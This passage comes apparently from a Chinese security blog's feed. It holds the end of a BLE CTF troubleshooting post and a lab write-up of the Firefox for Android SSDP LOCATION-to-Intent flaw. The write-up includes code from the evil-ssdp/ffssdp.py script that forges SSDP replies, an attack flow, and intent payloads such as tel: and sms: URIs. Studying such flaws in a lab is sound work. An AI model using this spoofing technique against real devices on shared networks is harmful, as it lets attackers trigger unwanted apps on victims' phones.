class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">connect to 64:B7:08:61:B9:7E: Device or resource busy (16)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>意味着你的蓝牙适配器 (hci0) <strong>已经被另一个应用程序或进程打开并独占使用了</strong><br>可能是没有完全退出的bluetoothctl或者gatttool服务<br>进行排查</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ps aux | grep bluetoothctl</span><br><span class="line">kali      202460  0.0  0.1   6520  2184 pts/0    S+   07:20   0:00 grep --color=auto bluetoothctl</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ps aux | grep gatttool</span><br><span class="line">kali      202840  0.0  0.1   6520  2336 pts/0    S+   07:21   0:00 grep --color=auto gatttool</span><br></pre></td></tr></table></figure><p>除了 grep 进程本身，没有其他名为 bluetoothctl &#x2F;gatttool的进程在运行。<br>所以依然是重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart bluetooth</span><br></pre></td></tr></table></figure><p>适配器也可以重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo hciconfig hci0 down</span><br><span class="line">sudo hciconfig hci0 up</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查状态，确保是 UP RUNNING</span></span><br><span class="line">hciconfig hci0</span><br></pre></td></tr></table></figure><h3 id="Device-64-B7-08-61-B9-7E-not-available"><a href="#Device-64-B7-08-61-B9-7E-not-available" class="headerlink" title="Device 64:B7:08:61:B9:7E not available"></a>Device 64:B7:08:61:B9:7E not available</h3><p>当一切都没有问题只有bluetoothctl有问题时，尝试scan on然后再scan off(记得关掉，因为前台没有显示但是用btmon看后台时它是一直在扫描的)，然后再连接就可以了,因为这强制更新了 bluetoothd 的设备状态缓存。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo bluetoothctl              </span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Agent registered</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">connect 64:B7:08:61:B9:7E</span></span><br><span class="line">Device 64:B7:08:61:B9:7E not available</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[bluetooth]<span class="comment"># exit</span></span></span><br><span class="line">                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the ascii value &quot;yo&quot; he</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo bluetoothctl</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Agent registered</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">connect 64:B7:08:61:B9:7E</span></span><br><span class="line">Device 64:B7:08:61:B9:7E not available</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">scan on</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">SetDiscoveryFilter success</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">hci0 <span class="built_in">type</span> 7 discovering on</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Discovery started</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Controller 84:E0:F4:03:0F:5E Discovering: <span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[NEW] Device 64:B7:08:61:B9:7E BLECTF</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[NEW] Device 54:61:CC:20:CD:5B 54-61-CC-20-CD-5B</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">scan off[NEW] Device 50:81:5C:20:B9:E0 50-81-5C-20-B9-E0</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">scan off</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">hci0 <span class="built_in">type</span> 7 discovering off</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Discovery stopped</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Device 50:81:5C:20:B9:E0 TxPower is nil</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Device 50:81:5C:20:B9:E0 RSSI is nil</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Device 54:61:CC:20:CD:5B TxPower is nil</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Device 54:61:CC:20:CD:5B RSSI is nil</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Device 64:B7:08:61:B9:7E TxPower is nil</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Device 64:B7:08:61:B9:7E RSSI is nil</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Controller 84:E0:F4:03:0F:5E Discovering: no</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">connect 64:B7:08:61:B9:7E</span></span><br><span class="line">Attempting to connect to 64:B7:08:61:B9:7E</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">hci0 64:B7:08:61:B9:7E <span class="built_in">type</span> LE Public connected eir_len 18</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">[CHG] Device 64:B7:08:61:B9:7E Connected: <span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">Connection successful</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Failed-to-start-discovery-org-bluez-Error-InProgress"><a href="#Failed-to-start-discovery-org-bluez-Error-InProgress" class="headerlink" title="Failed to start discovery: org.bluez.Error.InProgress"></a>Failed to start discovery: org.bluez.Error.InProgress</h3><p>尝试连接时的显示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo bluetoothctl</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Agent registered</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">connect 64:B7:08:61:B9:7E</span></span><br><span class="line">Device 64:B7:08:61:B9:7E not available</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">scan on</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">SetDiscoveryFilter success</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Failed to start discovery: org.bluez.Error.InProgress</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure><p>对应的btmon日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bluetoothctl[12451]: @ MGMT Open: bluetoothctl (privileged) version 1.23                                 &#123;0x0002&#125; 753.015752</span><br><span class="line">bluetoothd[8979]: @ MGMT Command: Start Discovery (0x0023) plen 1                                 &#123;0x0001&#125; [hci0] 775.725210</span><br><span class="line">        Address type: 0x07</span><br><span class="line">          BR/EDR</span><br><span class="line">          LE Public</span><br><span class="line">          LE Random</span><br><span class="line">@ MGMT Event: Command Complete (0x0001) plen 4                                                    &#123;0x0001&#125; [hci0] 775.725234</span><br><span class="line">      Start Discovery (0x0023) plen 1</span><br><span class="line">        Status: Busy (0x0a)</span><br><span class="line">        Address type: 0x07</span><br><span class="line">          BR/EDR</span><br><span class="line">          LE Public</span><br><span class="line">          LE Random</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>bluetoothd[8979]: @ MGMT Command: Start Discovery (0x0023) …: bluetoothd 确实通过管理接口向 hci0 发送了“启动发现”的命令。</p></li><li><p>@ MGMT Event: Command Complete (0x0001) … Start Discovery (0x0023) … Status: Busy (0x0a): <strong>这是关键。</strong> 蓝牙适配器 (hci0) 通过管理接口回复说，启动发现命令<strong>失败</strong>，因为适配器当前状态是 **Busy (忙碌，状态码 0x0a)**。</p></li></ul><p>措施依然是重启</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>靶场：<a class="link"   href="https://github.com/hackgnar/ble_ctf" >https://github.com/hackgnar/ble_ctf<i class="fas fa-external-link-alt"></i></a><br>蓝牙知识扩展：<br><a class="link"   href="https://www.bluetooth.com/" >https://www.bluetooth.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/Eronwu/Getting-Started-with-Bluetooth-Low-Energy-in-Chinese" >https://github.com/Eronwu/Getting-Started-with-Bluetooth-Low-Energy-in-Chinese<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/pauloborges/bluez/blob/master/attrib/gatttool.c" >https://github.com/pauloborges/bluez/blob/master/attrib/gatttool.c<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/Indication-and-Notification/ta-p/1129270" >https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/Indication-and-Notification/ta-p/1129270<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://blog.csdn.net/qq_36347513/article/details/118762746" >https://blog.csdn.net/qq_36347513/article/details/118762746<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-前期配置&quot;&gt;&lt;a href=&quot;#0x0-前期配置&quot; class=&quot;headerlink&quot; title=&quot;0x0 前期配置&quot;&gt;&lt;/a&gt;0x0 前期配置&lt;/h2&gt;&lt;p&gt;所需设备：蓝牙适配器，刷入了blectf的esp32,能进行蓝牙操作的设备（kali或者Ub</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>基于LAN的intent触发</title>
    <link href="http://arch3rn4r.github.io/2025/04/19/%E5%9F%BA%E4%BA%8ELAN%E7%9A%84intent%E8%A7%A6%E5%8F%91/"/>
    <id>http://arch3rn4r.github.io/2025/04/19/%E5%9F%BA%E4%BA%8ELAN%E7%9A%84intent%E8%A7%A6%E5%8F%91/</id>
    <published>2025-04-19T10:09:58.000Z</published>
    <updated>2025-05-02T02:41:59.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>Firefox for Android（68.11.0 及更低版本）会发送定期发送SSDP信息，在其解析LCATION时没有正确验证LOCATION字段的的信息，它错误地将 LOCATION 字段里的<strong>任何字符串</strong>（包括 intent:&#x2F;&#x2F; 这种非标准的 URI）直接传递给了 Android 系统的 Intent 处理机制。（打开 Web 浏览器的 URI 方案定义为 <code>http</code> 或 <code>https</code>。但是，Firefox 移动版中的原生 SSDP 代码会自行处理这些 URL，而不会将它们传递给 Intent 系统。）</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>低版本的Firefox for Android下载地址:<a class="link"   href="https://archive.mozilla.org/pub/mobile/releases/68.11.0/" >https://archive.mozilla.org/pub/mobile/releases/68.11.0/<i class="fas fa-external-link-alt"></i></a><br>测试脚本:<a class="link"   href="https://initblog.com/images/post-firefox/ffssdp.py" >https://initblog.com/images/post-firefox/ffssdp.py<i class="fas fa-external-link-alt"></i></a><br>测试设备：安装了目标版本的pixel4，kali Linux 虚拟机（wireshark，python3)<br>环境搭建：电脑和手机连接同一热点，使用wireshark进行抓包<br>在此次测试中的ip地址：<br>测试手机：192.168.165.49<br>电脑物理机：192.168.165.247<br>电脑虚拟机：192.168.165.40 </p><p><strong>注意事项</strong>：<br>1.虚拟机使用桥接模式，ip addr查看当前网段是否正确。在物理主机ipconfig和测试手机ifconfig查看当前网络信息，确保网段一致</p><p>2.使用wireshark抓包接口,比如现在就要抓包eth0处的流量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">─# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:0c:2d:ba brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.43.40/24 brd 192.168.43.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 2280sec preferred_lft 2280sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe0c:2dba/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.不要使用测试手机开热点，手机作为NAT网关时，默认<strong>隔离客户端间通信</strong>（类似AP隔离模式），此时抓包，只能收到热点手机大量的MDNS流量，局域网内的其他设备流量是正常的<img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419110240.png"                                        ></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="SSDP"><a href="#SSDP" class="headerlink" title="SSDP"></a>SSDP</h3><p>简单服务发现协议**（ <a class="link"   href="https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E5%8D%8F%E8%AE%AE" >SSDP<i class="fas fa-external-link-alt"></i></a>，Simple Service Discovery Protocol）是一种应用层协议，是构成<a class="link"   href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E5%8D%B3%E6%8F%92%E5%8D%B3%E7%94%A8"  title="通用即插即用">通用即插即用<i class="fas fa-external-link-alt"></i></a>(UPnP)技术的核心协议之一。用于在本地网络中自动发现设备和服务。它基于HTTPU（HTTP over UDP），通常使用UDP端口1900，多播地址239.255.255.250。M-SEARCH方法是SSDP协议中的一种请求类型，用于设备主动搜索特定类型的服务。<br>在 SSDP 中，发起方将通过本地网络发送广播，询问有关任何可用服务的详细信息，例如第二屏幕设备或联网扬声器。任何系统都可以回复有关描述其特定服务的 XML 文件位置的详细信息。然后，发起方将自动转到该位置以解析 XML。<br>它发出的包和响应包如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 07:29:47 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://example.com/device.xml</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure><p>SSDP 在 UDP 上使用两种形式的 HTTP：</p><ul><li>HTTPMU：基于多播 UDP 的 HTTP。这意味着请求通过 UDP 广播到整个网络。这用于客户端发现设备和服务器通告设备。</li><li>HTTPU：基于单播 UDP 的 HTTP。这意味着请求通过 UDP 从一个主机直接发送到另一个主机。这用于响应搜索请求。<br>LOCATION的值是一个URL，这个URL会指向一个xml文件，它遵循 UPnP 设备描述规范。它里面包含了关于设备的元数据和指向其他控制&#x2F;事件 URL 的信息。<br>需要注意的是，漏洞源于 Firefox 浏览器对 SSDP 响应中 LOCATION 字段的解析逻辑，而非 SSDP 协议本身或 XML 文件的解析过程。</li></ul><h3 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h3><p><a class="link"   href="https://initblog.com/images/post-firefox/ffssdp.py" >ffssdp.py<i class="fas fa-external-link-alt"></i></a>来自作者之前编写的工具<a class="link"   href="https://github.com/initstring/evil-ssdp" >evil-ssdp<i class="fas fa-external-link-alt"></i></a><br>它只能在linux中使用，因为它查找ip的途径是ifconfig</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_ip</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This function will attempt to automatically get the IP address of the</span></span><br><span class="line"><span class="string">    provided interface.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ip_regex = <span class="string">r&#x27;inet (?:addr:)?(.*?) &#x27;</span></span><br><span class="line">    sys_ifconfig = os.popen(<span class="string">&#x27;ifconfig &#x27;</span> + args.interface).read()</span><br><span class="line">    local_ip = re.findall(ip_regex, sys_ifconfig)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> local_ip[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="built_in">print</span>(PC.warn_box + <span class="string">&quot;Could not get network interface info. &quot;</span></span><br><span class="line">              <span class="string">&quot;Please check and try again.&quot;</span>)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><p>它不主动攻击，而是等待局域网中出现SSDP信息，然后对其进行回应<br>核心部分<br>伪造回应</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_location</span>(<span class="params">self, address, requested_st</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        This function replies back to clients letting them know where they can</span></span><br><span class="line"><span class="string">        access more information about our device. The keys here are the</span></span><br><span class="line"><span class="string">        &#x27;LOCATION&#x27; header and the &#x27;ST&#x27; header.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        When a client receives this information back on the port they</span></span><br><span class="line"><span class="string">        initiated a discover from, they will go to that location to look for an</span></span><br><span class="line"><span class="string">        XML file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        url = self.target</span><br><span class="line">        date_format = formatdate(timeval=<span class="literal">None</span>, localtime=<span class="literal">False</span>, usegmt=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        ssdp_reply = (<span class="string">&#x27;HTTP/1.1 200 OK\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;CACHE-CONTROL: max-age=1800\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;DATE: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;EXT:\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;LOCATION: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;01-NLS: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;SERVER: UPnP/1.0\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;ST: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;USN: &#123;&#125;::&#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;BOOTID.UPNP.ORG: 0\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;CONFIGID.UPNP.ORG: 1\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line">                      .<span class="built_in">format</span>(date_format,</span><br><span class="line">                              url,</span><br><span class="line">                              self.session_usn,</span><br><span class="line">                              requested_st,</span><br><span class="line">                              self.session_usn,</span><br><span class="line">                              requested_st))</span><br><span class="line">        ssdp_reply = <span class="built_in">bytes</span>(ssdp_reply, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.sock.sendto(ssdp_reply, address)</span><br></pre></td></tr></table></figure><p><strong>总结攻击流程:</strong></p><ol><li><strong>被动监听:</strong> 脚本在指定的网络接口上监听发往 SSDP 多播地址 (239.255.255.250:1900) 的 UDP 包。    </li><li><strong>捕获请求:</strong> 当收到一个包含 “M-SEARCH” 和有效 ST: 头部的 UDP 包时，记录下发送方的 IP 和端口。    </li><li><strong>条件判断:</strong> 如果不是分析模式，并且 ST 格式基本正确。    </li><li><strong>构造响应:</strong> 创建一个虚假的 SSDP 200 OK 响应。    </li><li><strong>注入载荷:</strong> 将用户指定的<strong>恶意 Intent URI</strong> 放入响应的 LOCATION 头部。    </li><li><strong>定向回击:</strong> 将这个伪造的、包含恶意 LOCATION 的响应直接发送回发送 M-SEARCH 请求的设备 IP 和端口。    </li><li><strong>漏洞触发 (在目标设备上):</strong> 如果接收设备是运行着易受攻击 Firefox 的 Android 设备，Firefox 会错误处理这个响应，将 LOCATION 字段的恶意 URI 交给 Android Intent 系统执行，导致非预期的行为（如打开拨号器）。</li></ol><h3 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h3><p>将-t后面替换成这里构造的语句就可以进行测试了</p><h4 id="拨号器"><a href="#拨号器" class="headerlink" title="拨号器"></a>拨号器</h4><p>Android 的核心应用程序之一 <strong>“拨号器” (Dialer)</strong> 在其 AndroidManifest.xml 中注册了一个 <strong>Intent Filter</strong>。这个 Intent Filter 声明它可以处理 ACTION_DIAL 或 ACTION_VIEW 类型的 Intent，并且其数据 (Data) 的 <strong>Scheme 是 tel</strong>。当你点击一个 tel:&#x2F;&#x2F;20250418 链接，或者某个应用（像这个漏洞中的 Firefox）将这个 URI 传递给系统时，Android 的 <strong>PackageManager</strong> 会查找哪个应用注册了能够处理 tel Scheme 的 Intent Filter。<br>PackageManager 找到了拨号器应用，系统启动拨号器应用，并将 20250418 这个号码传递给它，拨号器就会显示这个号码，等待用户确认拨打。</p><p>还有这样可以用于测试的scheme吗？</p><ul><li><strong>标准化组织:</strong> 一些最常见的 Schemes（如 http, https, ftp, mailto）是由互联网工程任务组 (IETF) 通过 RFC 文档标准化的。    </li><li><strong>平台约定:</strong> 其他一些 Schemes（如 tel, sms, geo - 地理位置）虽然可能没有严格的全球标准，但在特定平台（如 Android、iOS）上被广泛支持和理解，成为了事实上的标准。操作系统或核心应用程序（如拨号器、短信应用）会注册自己来处理这些 Schemes。</li></ul><p>这里有一些例子，除了拨号器和文件，其他的我没有进行测试，仅供参考</p><p><strong>sms: 或 smsto:</strong><br>    - <strong>触发应用:</strong> 默认的短信&#x2F;彩信应用。<br>    - <strong>作用:</strong> 打开短信编辑界面。<br>    - <strong>示例:</strong><br>        - sms:10086 (打开短信应用，收件人填好 10086)<br>        - sms:10086?body&#x3D;Hello (打开短信应用，填好收件人和短信内容 “Hello”)<br>        - smsto:10086 (功能类似，sms: 更常用)<br> <strong>mailto:</strong><br>    - <strong>触发应用:</strong> 默认的电子邮件客户端 (如 Gmail)。<br>    - <strong>作用:</strong> 打开邮件编辑界面。<br>    - <strong>示例:</strong><br>        - mailto:<a class="link"   href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;" >&#117;&#115;&#x65;&#114;&#x40;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a> (打开邮件应用，填好收件人)<br>        - mailto:<a class="link"   href="mailto:&#x75;&#115;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;" >&#x75;&#115;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>?subject&#x3D;Inquiry&amp;body&#x3D;Hi%20there (填好收件人、主题和正文，注意正文需要 URL 编码)<br>        - mailto:?to&#x3D;<a class="link"   href="mailto:&#117;&#115;&#101;&#114;&#49;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;" >&#117;&#115;&#101;&#114;&#49;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;<i class="fas 